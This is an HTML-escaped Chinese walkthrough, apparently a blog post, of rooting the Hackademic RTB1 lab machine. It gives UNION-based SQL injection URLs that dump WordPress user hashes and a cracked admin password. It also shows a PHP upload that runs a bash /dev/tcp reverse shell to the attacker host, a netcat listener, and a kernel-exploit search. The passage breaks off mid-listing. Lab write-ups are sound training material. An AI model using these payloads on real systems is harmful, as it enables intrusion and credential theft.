ary \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2011\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e am\n\nThis is the first Realistic Hackademic \u003cspan class=\"hljs-title function_ invoke__\"\u003eChallenge\u003c/span\u003e (root this box).\nHave you got the skills to exploit this box \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e to take root?\n\nGoal:\nGain access to \u003cspan class=\"hljs-title function_ invoke__\"\u003ethe\u003c/span\u003e (HackademicRTB1) box \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e read the “Key.txt” file in the root directory.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发现，点击页面的\u003ccode\u003eGet root\u003c/code\u003e链接后的url是这样的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ehttp:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.132/Hackademic_RTB1/?p=9\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e以及下方 \u003ccode\u003eUncategorized\u003c/code\u003e 的链接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ehttp:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.132/Hackademic_RTB1/?cat=1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e?p\u003c/code\u003e 以及\u003ccode\u003e?cat\u003c/code\u003e很可能存在\u003ccode\u003esql\u003c/code\u003e注入漏洞\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试一下\u003ccode\u003esql\u003c/code\u003e注入和文件包含\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ep\u003c/code\u003e参数无任何回显，应该不存在sql注入和文件包含\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ecat\u003c/code\u003e输入\u003ccode\u003e1'\u003c/code\u003e ,发现页面回显有问题，把sql语句爆了出来，\u003ccode\u003eSELECT * FROM wp_categories WHERE cat_ID = 1\\\\\\' LIMIT 1\u003c/code\u003e ，并且可以看到表是\u003ccode\u003ewp_categories\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubHackademic%20RTB1/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试注入，手工\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 存在注入点\u003c/span\u003e\nhttp:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.132/Hackademic_RTB1/?cat=1 and 1=2\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 表的列数有五列\u003c/span\u003e\nhttp:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.132/Hackademic_RTB1/?cat=1 order by 5\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 爆回显位，页面回显位是第二位\u003c/span\u003e\nhttp:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,2,3,4,5\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 爆库，页面回显 wordpress ，表示库名是wordpress \u003c/span\u003e\nhttp:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,database(),3,4,5\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发现库名是\u003ccode\u003ewordpress\u003c/code\u003e ，猜测CMS是\u003ccode\u003ewordpress\u003c/code\u003e ，我们寻找一下看看有没有有用的信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubHackademic%20RTB1/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现确实是\u003ccode\u003ewordpress\u003c/code\u003e并且版本是\u003ccode\u003e1.5.11\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e为了方便注入，我们到网上查找\u003ccode\u003ewordpress\u003c/code\u003e的表结构\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://codex.wordpress.org/Database_Description/2.0\"\u003ehttps://codex.wordpress.org/Database_Description\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e值得我们关注的是 **\u003ccode\u003ewp_users\u003c/code\u003e**表\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003euser_login\u003c/code\u003e，\u003ccode\u003euser_pass\u003c/code\u003e，\u003ccode\u003euser_level\u003c/code\u003e 中的三个字段\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e接着注入\u003c/p\u003e\n\u003cp\u003e获取表的\u003ccode\u003euser_login\u003c/code\u003e，\u003ccode\u003euser_pass\u003c/code\u003e，\u003ccode\u003euser_level\u003c/code\u003e 中的三个字段，并以\u003ccode\u003e-\u003c/code\u003e为分隔符\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ehttp:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,group_concat(user_login,0x2d,user_pass,0x2d,user_level),3,4,5 from wp_users\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到数据：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eNickJames-\u003cspan class=\"hljs-number\"\u003e21232\u003c/span\u003ef297a57a5a743894a0e4a801fc3-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\nJohnSmith-b986448f0bb9e5e124ca91d3d650f52c-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\nGeorgeMiller-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003ecbb3252ba6b7e9c422fac5334d22054-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e,\nTonyBlack-a6e514f9486b83cb53d8d932f9a04292-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\nJasonKonnors-\u003cspan class=\"hljs-number\"\u003e8601\u003c/span\u003ef6e1028a8e8a966f6c33fcd9aec4-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\nMaxBucky-\u003cspan class=\"hljs-number\"\u003e50484\u003c/span\u003ec19f1afdaf3841a0d821ed393d2-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以发现\u003ccode\u003eGeorgeMiller\u003c/code\u003e 的权限是10是最大的，密码格式看着像是\u003ccode\u003emd5\u003c/code\u003e，我们拿到cmd5破解\u003c/p\u003e\n\u003cp\u003e查询结果：\u003ccode\u003eq1w2e3\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们找到后台，使用\u003ccode\u003eGeorgeMiller\u003c/code\u003e 登陆进去\u003c/p\u003e\n\u003cp\u003e后台地址是 ： \u003ccode\u003ehttp://192.168.75.132/Hackademic_RTB1/wp-login.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e登陆成功！\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e登录后台上传shell\u003c/h2\u003e\n\u003cp\u003e登陆后台后，wordpress我们一般要做的是打开文件上传功能，并且上传getshell\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e开启文件上传功能，并且添加php后缀\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubHackademic%20RTB1/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传getshell.php\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubHackademic%20RTB1/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e文件内容是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e// getshell.php\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e\u0026#x3C;?php\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.75.131/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e); \u003cspan class=\"hljs-meta\"\u003e?\u003e\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传成功,并且返回路径 \u003ccode\u003e/Hackademic_RTB1/wp-content/getshell.php\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e反弹shell\u003c/p\u003e\n\u003cp\u003e首先Kali先开启监听，监听\u003ccode\u003e1234\u003c/code\u003e端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e                             \nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再访问\u003ccode\u003e/Hackademic_RTB1/wp-content/getshell.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e最后查看kali，发现反弹shell成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.132\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.131\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.132\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e49339\u003c/span\u003e\nbash: no job control in this shell\nbash-\u003cspan class=\"hljs-number\"\u003e4.0\u003c/span\u003e$ ls\nls\ngetshell.php\ngetshell_01.php\nplugins\nthemes\nbash-\u003cspan class=\"hljs-number\"\u003e4.0\u003c/span\u003e$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e先用python增强shell的交互性\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 靶机shell\u003c/span\u003e\npython -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/bash')\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看shell权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 靶机shell\u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e4.0\u003c/span\u003e$ whoami\napache\n\nbash-\u003cspan class=\"hljs-number\"\u003e4.0\u003c/span\u003e$ dpkg -l\nbash: dpkg: command not found\n\nbash-\u003cspan class=\"hljs-number\"\u003e4.0\u003c/span\u003e$ sudo -l\nsudo: sorry, you must have a tty to run sudo\n\nbash-\u003cspan class=\"hljs-number\"\u003e4.0\u003c/span\u003e$ uname -a\nLinux HackademicRTB1 \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e31.5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e127\u003c/span\u003e.fc12.i686 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用户是\u003ccode\u003eapache\u003c/code\u003e ，\u003ccode\u003edpkg\u003c/code\u003e和 \u003ccode\u003esudo\u003c/code\u003e 无法使用，内核版本是\u003ccode\u003e2.6.31.5\u003c/code\u003e ，权限是比较低的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为ssh是关闭的，所以我们找密码也没有用处，看到内核版本比较老，可以尝试一下搜索内核漏洞，但是内核版本不太太详细，否则或错过一些好使的漏洞，并且过滤 “\u003ccode\u003ePrivilege Escalation\u003c/code\u003e” - 权限提升\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003esearchsploit Linux Kernel \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e | grep \u003cspan class=\"hljs-string\"\u003e\"Privilege Escalation\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eLinux \u003cspan class=\"hljs-title function_ invoke__\"\u003eKernel\u003c/span\u003e (Solaris \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e / \u0026#x3C; \u003cspan class=\"hljs-number\"\u003e5.10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e138888\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e) - Local Privilege Escalation | solaris/local/\u003cspan class=\"hljs-number\"\u003e15962\u003c/span\u003e.c\nLinux Kernel \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - \u003cspan class=\"hljs-string\"\u003e'mremap()'\u003c/span\u003e Local Privilege Escalation  | linux/local/\u003cspan class=\"hljs-number\"\u003e160\u003c/span\u003e.c\nLinux Kernel \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003
